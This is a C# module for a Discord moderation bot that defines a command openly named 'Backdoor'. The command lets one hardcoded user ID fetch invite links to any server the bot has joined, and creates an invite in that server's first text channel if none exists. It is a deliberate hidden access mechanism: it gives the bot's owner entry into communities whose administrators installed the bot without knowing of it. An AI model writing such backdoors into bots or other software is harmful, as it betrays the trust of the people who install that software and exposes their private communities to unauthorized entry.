using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace ProvigoBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("Backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (!(Context.User.Id == 163948200338784256))
            {
                await Context.Channel.SendMessageAsync(":x: :white_check_mark: You are not a bot moderator!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I an not i a guild with id=" + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with error ''{ex.Message}'' ");
                    return;
                }
            }

            Invites = null;
            Invites = await Guild.GetInvitesAsync();
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for guild {Guild.Name}: ", Guild.IconUrl);
            Embed.WithColor(40, 22, 100);
            foreach (var Current in Invites)
                Embed.AddInlineField("Invite:", $"[Invites]({Current.Url})");

            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }
    }
}
